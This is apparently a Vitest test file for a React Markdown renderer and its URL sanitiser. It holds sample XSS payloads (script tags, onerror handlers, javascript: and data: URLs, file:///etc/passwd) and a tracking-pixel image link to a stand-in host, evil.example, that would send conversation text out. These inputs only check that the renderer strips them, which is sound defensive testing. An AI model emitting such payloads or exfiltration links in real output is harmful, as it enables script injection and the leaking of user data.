import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { MarkdownView, safeUrl } from './markdown-view';

const html = (md: string) => renderToStaticMarkup(<MarkdownView>{md}</MarkdownView>);

describe('MarkdownView', () => {
  it('renders headings, lists, tables, code and emphasis', () => {
    const out = html(
      [
        '# Tiêu đề',
        '',
        '- một',
        '- hai',
        '',
        '1. a',
        '2. b',
        '',
        '| Từ | Nghĩa |',
        '| --- | --- |',
        '| follow up | theo dõi |',
        '',
        '**đậm** và `inline`',
        '',
        '```',
        'const x = 1;',
        '```',
      ].join('\n'),
    );
    expect(out).toContain('Tiêu đề');
    expect(out).toContain('<ul');
    expect(out).toContain('<ol');
    expect(out).toContain('<table');
    expect(out).toContain('<td');
    expect(out).toContain('<strong>đậm</strong>');
    expect(out).toContain('<pre');
    expect(out).toContain('const x = 1;');
  });

  it('never outputs a script element or an event handler from raw HTML', () => {
    const out = html(
      'hi <script>alert(1)</script> <img src="x" onerror="alert(1)"> <b onclick="x()">b</b>',
    );
    expect(out).not.toContain('<script');
    expect(out).not.toContain('<img');
    expect(out).not.toMatch(/\son\w+=/i);
    expect(out).not.toContain('alert(1)</script>');
  });

  it('does not render javascript:, data: or other schemes as links', () => {
    for (const url of [
      'javascript:alert(1)',
      'JaVaScRiPt:alert(1)',
      ' javascript:alert(1)',
      'data:text/html;base64,PHNjcmlwdD4=',
      'vbscript:x',
      'file:///etc/passwd',
      '/relative',
    ]) {
      const out = html(`[click](<${url}>)`);
      expect(out).not.toContain('<a ');
      expect(out).not.toMatch(/href=/i);
      expect(out).toContain('click');
    }
  });

  it('opens http, https and mailto links in a new tab with noopener noreferrer', () => {
    for (const url of ['https://example.com/a?b=1', 'http://example.com', 'mailto:a@example.com']) {
      const out = html(`[go](${url})`);
      expect(out).toContain(`href="${url}"`);
      expect(out).toContain('target="_blank"');
      expect(out).toContain('rel="noopener noreferrer"');
    }
  });

  it('does not load remote images, in either Markdown or autolinked form', () => {
    for (const md of [
      '![secret](https://evil.example/pixel.png?q=conversation)',
      '![](https://evil.example/pixel.png)',
      '![x](data:image/png;base64,AAAA)',
      '[![x](https://evil.example/p.png)](https://example.com)',
    ]) {
      const out = html(md);
      expect(out).not.toContain('<img');
      expect(out).not.toContain('evil.example/pixel');
      expect(out).not.toContain('evil.example/p.png');
    }
    expect(html('![sơ đồ](https://evil.example/a.png)')).toContain('sơ đồ');
  });
});

describe('safeUrl', () => {
  it('keeps only http, https and mailto', () => {
    expect(safeUrl('https://a.dev')).toBe('https://a.dev');
    expect(safeUrl('java\nscript:alert(1)')).toBeNull();
    expect(safeUrl('//evil.example')).toBeNull();
    expect(safeUrl('')).toBeNull();
  });
});
